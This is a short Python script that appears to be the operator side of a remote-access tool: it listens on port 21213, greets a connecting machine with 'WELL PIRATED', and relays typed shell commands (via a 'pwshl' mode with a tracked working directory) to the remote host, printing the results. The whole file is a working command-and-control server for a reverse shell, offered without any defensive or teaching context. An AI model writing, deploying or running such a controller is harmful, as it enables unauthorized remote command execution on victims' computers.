import socket
import time

HOST = ""
PORT = 21213

# OPEN THE CONNECTION
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
print(f"SERVER IS LISTENING ON PORT {PORT}")
server.listen(1)

print("Waiting for a connection...")
user, addr = server.accept()
print(f"CONNECTED ! ADDR:{addr} ! WELL PIRATED !!!!!!!!")
data = user.recv(1024).decode()
print(f"Welcome data: \n\n{data}\n")

cd = "./"

is_server_on = True
while is_server_on:
    cmd = input(">>> ")
    if cmd == "quit":
        is_server_on = False
        user.send("disconnect".encode())

    if cmd == "pwshl":
        while True:
            sd = input("What do you want to send ? >>> ")
            if "?reset" in sd:
                cd = "./"
                pass
            if "?cd " in sd:
                cd = sd.replace("?cd ", "")
                print(f"The directory is now: {cd}")
                pass
            if sd == "EXIT":
                break

            user.send("pwshl".encode())
            time.sleep(0.2)
            sd = f"cd {cd};{sd}"
            user.send(sd.encode())
            data = user.recv(1024 * 32).decode()
            print(f"USER: {data}")
